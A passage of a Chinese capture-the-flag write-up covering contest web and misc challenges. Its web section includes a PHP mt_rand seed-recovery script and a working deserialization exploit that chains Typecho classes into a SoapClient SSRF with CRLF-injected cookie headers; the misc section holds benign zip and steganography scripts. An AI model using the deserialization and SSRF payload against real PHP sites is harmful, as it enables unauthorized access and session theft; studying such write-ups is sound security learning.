<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">36</span> <span class="number">36</span> <span class="number">0</span> <span class="number">61</span> <span class="number">47</span> <span class="number">47</span> <span class="number">0</span> <span class="number">61</span> <span class="number">42</span> <span class="number">42</span> <span class="number">0</span> <span class="number">61</span> <span class="number">41</span> <span class="number">41</span> <span class="number">0</span> <span class="number">61</span> <span class="number">52</span> <span class="number">52</span> <span class="number">0</span> <span class="number">61</span> <span class="number">37</span> <span class="number">37</span> <span class="number">0</span> <span class="number">61</span> <span class="number">3</span> <span class="number">3</span> <span class="number">0</span> <span class="number">61</span> <span class="number">35</span> <span class="number">35</span> <span class="number">0</span> <span class="number">61</span> <span class="number">36</span> <span class="number">36</span> <span class="number">0</span> <span class="number">61</span> <span class="number">43</span> <span class="number">43</span> <span class="number">0</span> <span class="number">61</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">61</span> <span class="number">47</span> <span class="number">47</span> <span class="number">0</span> <span class="number">61</span> <span class="number">55</span> <span class="number">55</span> <span class="number">0</span> <span class="number">61</span> <span class="number">13</span> <span class="number">13</span> <span class="number">0</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">0</span> <span class="number">61</span> <span class="number">29</span> <span class="number">29</span> <span class="number">0</span> <span class="number">61</span></span><br></pre></td></tr></table></figure>

<p>用php_mt_seed跑出种子为 <code>1775196155</code></p>
<p><img src="/2020/03/2020北邮校赛/image-20200411232419172.png" alt="image-20200411232419172"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//genarate private_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">&#125;</span><br><span class="line">$Public_key = public_key();</span><br><span class="line">$private_key = private_key();</span><br><span class="line"><span class="keyword">echo</span> $Public_key . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $private_key;</span><br></pre></td></tr></table></figure>

<p>得到私钥 <code>XuNhoueCDCGc</code>这里需要注意的是php版本大版本要和题目环境相同，不然得出的私钥是不一样的</p>
<p>最后通过万能密码拿到flag</p>
<p><img src="/2020/03/2020北邮校赛/image-20200411233744024.png" alt="image-20200411233744024"></p>
<h3 id="7-Ezpop-Revenge"><a href="#7-Ezpop-Revenge" class="headerlink" title="7.Ezpop_Revenge"></a>7.Ezpop_Revenge</h3><p>没写出来，复现学习一下</p>
<p>还是<code>www.zip</code>源码泄露</p>
<p>flag.php暗示应该要SSRF</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]===<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">   $_SESSION[<span class="string">'flag'</span>]= <span class="string">"MRCTF&#123;******&#125;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"我扌your problem?\nonly localhost can get flag!"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>接着找反序列的位置</p>
<p><img src="/2020/03/2020北邮校赛/image-20200412124013730.png" alt="image-20200412124013730"></p>
<p><code>Plugin.php</code>中关键的代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag=<span class="string">"MRCTF&#123;this_is_a_fake_flag&#125;"</span>;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $db = <span class="keyword">new</span> Typecho_Db(<span class="keyword">$this</span>-&gt;coincidence[<span class="string">'hello'</span>], <span class="keyword">$this</span>-&gt;coincidence[<span class="string">'world'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_Plugin</span> <span class="keyword">implements</span> <span class="title">Typecho_Plugin_Interface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'admin'</span>])) var_dump($_SESSION);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'C0incid3nc3'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">"/file|assert|eval|[`\'~^?&lt;&gt;$%]+/i"</span>,base64_decode($_POST[<span class="string">'C0incid3nc3'</span>])) === <span class="number">0</span>)</span><br><span class="line">                unserialize(base64_decode($_POST[<span class="string">'C0incid3nc3'</span>]));</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Not that easy."</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反序列化会触发 <code>__wakeup()</code> 并实例化 <code>Typecho_Db</code>类，跟进<code>/var/Typecho/Db.php</code></p>
<p><img src="/2020/03/2020北邮校赛/image-20200412131913212.png" alt></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db</span></span></span><br><span class="line"><span class="class"></span>&#123;	</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($adapterName, $prefix = <span class="string">'typecho_'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapterName = $adapterName;</span><br><span class="line">        $adapterName = <span class="string">'Typecho_Db_Adapter_'</span> . $adapterName;</span><br><span class="line">        <span class="keyword">if</span> (!call_user_func(<span class="keyword">array</span>($adapterName, <span class="string">'isAvailable'</span>))) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Typecho_Db_Exception(<span class="string">"Adapter &#123;$adapterName&#125; is not available"</span>);<span class="comment">//__toString()</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_prefix = $prefix;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** 初始化内部变量 */</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_pool = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化适配器对象</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> $adapterName();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>也提示了 <code>__toString()</code> 方法，接着搜</p>
<p><img src="/2020/03/2020北邮校赛/image-20200412141521405.png" alt="image-20200412141521405"></p>
<p>在 <code>/var/Typecho/Db/Query.php</code> 中<code>__toString</code>可被利用 </p>
<p>关键代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/** 数据库关键字 */</span></span><br><span class="line">    <span class="keyword">const</span> KEYWORDS = <span class="string">'*PRIMARY|AND|OR|LIKE|BINARY|BY|DISTINCT|AS|IN|IS|NULL'</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> $_default = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'action'</span> =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'table'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'fields'</span> =&gt; <span class="string">'*'</span>,</span><br><span class="line">        <span class="string">'join'</span>   =&gt; <span class="keyword">array</span>(),</span><br><span class="line">        <span class="string">'where'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'limit'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'offset'</span> =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'order'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'group'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'having'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'rows'</span>   =&gt; <span class="keyword">array</span>(),</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">private</span> $_adapter;</span><br><span class="line">    <span class="keyword">private</span> $_sqlPreBuild;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(Typecho_Db_Adapter $adapter, $prefix)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = &amp;$adapter;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_prefix = $prefix;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sqlPreBuild = <span class="keyword">self</span>::$_default;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'action'</span>]) &#123;</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::SELECT:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_adapter-&gt;parseSelect(<span class="keyword">$this</span>-&gt;_sqlPreBuild);</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::INSERT:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'INSERT INTO '</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'table'</span>]</span><br><span class="line">                . <span class="string">'('</span> . implode(<span class="string">' , '</span>, array_keys(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>])) . <span class="string">')'</span></span><br><span class="line">                . <span class="string">' VALUES '</span></span><br><span class="line">                . <span class="string">'('</span> . implode(<span class="string">' , '</span>, array_values(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>])) . <span class="string">')'</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'limit'</span>];</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::DELETE:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'DELETE FROM '</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'table'</span>]</span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'where'</span>];</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::UPDATE:</span><br><span class="line">                $columns = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>])) &#123;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>] <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">                        $columns[] = <span class="string">"$key = $val"</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="string">'UPDATE '</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'table'</span>]</span><br><span class="line">                . <span class="string">' SET '</span> . implode(<span class="string">' , '</span>, $columns)</span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'where'</span>];</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>假设<code>$this-&gt;_sqlPreBuild[&#39;action&#39;]</code>为SELECT，在<code>__toString()</code>方法内就会返回<code>$this-&gt;_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild)</code>，调用了<code>$this-&gt;_adapter</code>的<code>parseSelect()</code>方法。</p>
<p><strong>POP链逻辑：</strong></p>
<ul>
<li>反序列化<code>HelloWorld_DB</code>，就触发了<code>__wakeup()</code>方法，在<code>__wakeup()</code>内实例化<code>Typecho_Db</code>并以<code>$this-&gt;coincidence[&#39;hello&#39;]</code>作为<code>Typecho_Db</code>的<code>__construct()</code>方法的第一个参数；</li>
<li>PHP的数组是可以存对象，假设<code>$this-&gt;coincidence[&#39;hello&#39;]</code>实例化<code>Typecho_Db_Query</code>对象，在<code>Typecho_Db</code>的构造方法中将其作为字符串，就触发了<code>Typecho_Db_Query</code>的<code>__toString()</code>方法；</li>
<li>在<code>__toString()</code>内，如果<code>$_sqlPreBuild[&#39;action&#39;]</code>为<code>&#39;SELECT&#39;</code>就会触发<code>$_adapter</code>的<code>parseSelect()</code>方法；</li>
<li>将<code>$_adapter</code>实例化为<code>SoapClient</code>，调用<code>parseSelect()</code>是不存在的方法，触发了<code>SoapClient</code>的<code>__call()</code>魔术方法</li>
<li><code>__call()</code>是实现SSRF的关键</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> SoapClient::__call ( string $function_name , <span class="keyword">array</span> $arguments )</span><br></pre></td></tr></table></figure>

<p>接着找插件在哪里调用了</p>
<p><img src="/2020/03/2020北邮校赛/image-20200412151046867.png" alt="image-20200412151046867"></p>
<p><code>/var/Typecho/Plugin.php</code>中有条路由</p>
<p><img src="/2020/03/2020北邮校赛/image-20200412195650568.png" alt="image-20200412195650568"></p>
<p>访问 <code>/page_admin</code>即可启用插件</p>
<p>想要带SESSION出来，必须要把自己的PHPSESSID传过去，然而SOAP并不能设置Cookie，因此需要CRLF。SoapClient可以设置UA，只要在UA后加上<code>\r\nCookie: PHPSESSID=xxx</code>就能为http头添加一个新的Cookie字段，这样就能带上session了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_adapter;</span><br><span class="line">    <span class="keyword">private</span> $_sqlPreBuild;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $target = <span class="string">"http://127.0.0.1/flag.php"</span>;</span><br><span class="line">        $headers = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">            <span class="string">"Cookie: PHPSESSID=s8fo8ma30gbttqvgdbb48k6rw3"</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>, <span class="keyword">array</span>(<span class="string">'uri'</span> =&gt; <span class="string">'hello'</span>, <span class="string">'location'</span> =&gt; $target, <span class="string">'user_agent'</span> =&gt; <span class="string">'test^^'</span> . join(<span class="string">'^^'</span>, $headers)));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sqlPreBuild = [<span class="string">'action'</span> =&gt; <span class="string">"SELECT"</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;coincidence = <span class="keyword">array</span>(<span class="string">"hello"</span> =&gt; <span class="keyword">new</span> Typecho_Db_Query());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$o = serialize(<span class="keyword">new</span> HelloWorld_DB());</span><br><span class="line">$o = preg_replace(<span class="string">" /\^\^/"</span>, <span class="string">"\r\n"</span>, $o);</span><br><span class="line">$r = base64_encode($o);</span><br><span class="line"><span class="keyword">echo</span> $r;</span><br></pre></td></tr></table></figure>

<p>POST提交payload</p>
<p><img src="/2020/03/2020北邮校赛/image-20200412194618150.png" alt="image-20200412194618150"></p>
<p>注意将PHPSESSID改成脚本中的值，GET提交admin=1打印flag</p>
<p><img src="/2020/03/2020北邮校赛/image-20200412194656862.png" alt="image-20200412194656862"></p>
<h3 id="8-So-Web-Application"><a href="#8-So-Web-Application" class="headerlink" title="8.So Web Application"></a>8.So Web Application</h3><p>这道题很懵。</p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="1-千层套路"><a href="#1-千层套路" class="headerlink" title="1.千层套路"></a>1.千层套路</h3><p>给了个压缩包，包名就是解压密码，有很多层。。。</p>
<p>直接脚本跑</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#python2</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line">next_file = <span class="string">""</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    file = <span class="string">"0573.zip"</span></span><br><span class="line">    zf = zipfile.ZipFile(file)</span><br><span class="line">    <span class="comment"># f=zf.open('1.xlsx',mode='r',pwd='123456'.encode('utf-8'))</span></span><br><span class="line">    a = zf.namelist()</span><br><span class="line">    next_file = a[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        password = file.replace(<span class="string">".zip"</span>, <span class="string">""</span>)</span><br><span class="line">        zf.extractall(pwd=password)</span><br><span class="line">    <span class="keyword">except</span> RuntimeError <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">    zf.close()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">        zf = zipfile.ZipFile(next_file)</span><br><span class="line">        <span class="comment"># f=zf.open('1.xlsx',mode='r',pwd='123456'.encode('utf-8'))</span></span><br><span class="line">        a = zf.namelist()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            password = next_file.replace(<span class="string">".zip"</span>, <span class="string">""</span>)</span><br><span class="line">            <span class="comment"># print password</span></span><br><span class="line">            zf.extractall(pwd=password)</span><br><span class="line">        <span class="keyword">except</span> RuntimeError <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">        next_file = a[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">print</span> (next_file)</span><br></pre></td></tr></table></figure>

<p>得到qt.txt, 40000个像素点，也是脚本还原</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> skimage <span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">img = np.zeros((<span class="number">200</span>,<span class="number">200</span>))</span><br><span class="line">print(img)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'qr.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">            <span class="keyword">if</span> data[i*<span class="number">200</span>+j] == <span class="string">"(255, 255, 255)\n"</span>:</span><br><span class="line">                img[i][j] = <span class="number">255</span></span><br><span class="line">            <span class="keyword">else</span>: img[i][j] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    plt.imshow(img,cmap=<span class="string">'gray'</span>)</span><br><span class="line">    plt.show()</span><br><span class="line">    plt.close()</span><br></pre></td></tr></table></figure>

<h3 id="2-寻找xxx"><a href="#2-寻找xxx" class="headerlink" title="2.寻找xxx"></a>2.寻找xxx</h3><p><img src="/2020/03/2020北邮校赛/image-20200413153919998.png" alt="image-20200413153919998"></p>
<p><img src="/2020/03/2020北邮校赛/image-20200413154311175.png" alt="image-20200413154311175"></p>
<p>把得到的数字 <code>18684221609</code> 发公众号</p>
<h3 id="3-Hello-misc"><a href="#3-Hello-misc" class="headerlink" title="3.Hello_ misc"></a>3.Hello_ misc</h3><p>解压后是一张图片，图片最上面只有红绿两种颜色。和一个flag.rar 密码压缩包</p>
<p>用foremost从图片中提取到一个带密码的压缩包。</p>
<p>把图片的红色区域裁剪出来 <code>img.png</code></p>
<p><img src="/2020/03/2020北邮校赛/img.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> skimage <span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">img = io.imread(<span class="string">'img.png'</span>)</span><br><span class="line">x = img.shape[<span class="number">0</span>]</span><br><span class="line">y = img.shape[<span class="number">1</span>]</span><br><span class="line">ret = np.zeros((x,y))</span><br><span class="line"><span class="comment">#(255,0,0) 红色</span></span><br><span class="line"><span class="comment">#(0,0,255) 蓝色</span></span><br><span class="line">c=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(y):</span><br><span class="line">        <span class="keyword">if</span>(img[i,j,<span class="number">0</span>]) == <span class="number">255</span>:</span><br><span class="line">            c +=<span class="string">'1'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            c += <span class="string">'0'</span></span><br><span class="line"></span><br><span class="line">b = re.findall(<span class="string">r'.&#123;8&#125;'</span>,c)</span><br><span class="line"></span><br><span class="line">d = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    d.append(int(i, <span class="number">2</span>))</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'out.png'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line">        t = struct.pack(<span class="string">'B'</span>,i)</span><br><span class="line">        f.write(t)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/2020北邮校赛/out.png" alt="out"></p>
<p>得到out.txt</p>
<p>里面只有 <code>127 255 63 191</code> 这四个数字</p>
<p>猜测为 <code>00 01 10 11</code>的组合</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permute</span><span class="params">(nums)</span>:</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> permutations(nums, len(nums)):</span><br><span class="line">        result.append(list(i))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">bin_list = [<span class="string">'00'</span>, <span class="string">'01'</span>, <span class="string">'10'</span>,<span class="string">'11'</span>]</span><br><span class="line">bin_list=permute(bin_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'out.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ret = f.readlines()</span><br><span class="line">    p = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ret:</span><br><span class="line">        p.append(int(i))</span><br><span class="line"></span><br><span class="line">    out=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> bin_list:</span><br><span class="line">        s = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> p:</span><br><span class="line">            <span class="keyword">if</span> j == <span class="number">63</span>:</span><br><span class="line">                a = i[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">elif</span> j == <span class="number">127</span>:</span><br><span class="line">                a = i[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">elif</span> j == <span class="number">191</span>:</span><br><span class="line">                a = i[<span class="number">2</span>]</span><br><span class="line">            <span class="keyword">elif</span> j == <span class="number">255</span>:</span><br><span class="line">                a = i[<span class="number">3</span>]</span><br><span class="line">            s += a</span><br><span class="line">        out.append(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> out:</span><br><span class="line">    d = re.findall(<span class="string">r'.&#123;8&#125;'</span>,i)</span><br><span class="line">    o = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> d:</span><br><span class="line">        o += chr(int(j, <span class="number">2</span>))</span><br><span class="line">    print(o)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/2020北邮校赛/image-20200413180554762.png" alt="image-20200413180554762"></p>
<p>得到flag.rar解压密码</p>
<p>解压发现</p>
<p><img src="/2020/03/2020北邮校赛/image-20200413180722339.png" alt="image-20200413180722339"></p>
<p>所以改后缀为<code>docx</code></p>
<p>里面是空的 ，似曾相识？</p>
<p>直接全选，改字体颜色</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">MTEwMTEwMTExMTExMTEwMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTEwMDAwMDAxMTExMTExMTExMDAxMTAx</span></span><br><span class="line"><span class="attribute">MTEwMTEwMTEwMDAxMTAxMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTExMTExMTExMTExMTEwMTEwMDEx</span></span><br><span class="line"><span class="attribute">MTEwMDAwMTAxMTEwMTExMDExMTEwMTExMTExMTAwMDExMTExMTExMTExMDAxMDAxMTAxMTEwMDAwMDExMTExMDAwMDExMTExMTEx</span></span><br><span class="line"><span class="attribute">MTEwMTEwMTAwMDAxMTExMDExMTEwMTExMTExMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTExMTExMTAwMTEwMTExMTExMTExMTEx</span></span><br><span class="line"><span class="attribute">MTEwMTEwMTAxMTExMTExMDExMTEwMTExMTAxMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTAxMTExMTAwMTEwMTExMTExMTExMTEx</span></span><br><span class="line"><span class="attribute">MTEwMTEwMTAwMDAxMTAwMDAwMTEwMDAwMDAxMTAwMDExMTAwMDAwMTEwMTEwMTEwMTAxMTEwMDAwMDAxMTExMDAwMDExMTExMTEx</span></span><br></pre></td></tr></table></figure>

<p>看起来像base64隐写，但之前用的脚本打印出来全是不可见字符，所以找了个新脚本</p>
<p><img src="/2020/03/2020北邮校赛/image-20200413183342138.png" alt="image-20200413183342138"></p>
<p><img src="/2020/03/2020北邮校赛/image-20200413183650016.png" alt="image-20200413183650016"></p>
<h3 id="4-pyFlag"><a href="#4-pyFlag" class="headerlink" title="4.pyFlag"></a>4.pyFlag</h3><p>题目给了三张图片，放到winhex下，可以发现尾部分别有一个部分，将它们组合在一起，可以得到，一个zip。</p>
<p>然后爆破压缩包密码是1234</p>
<p>得到密文</p>
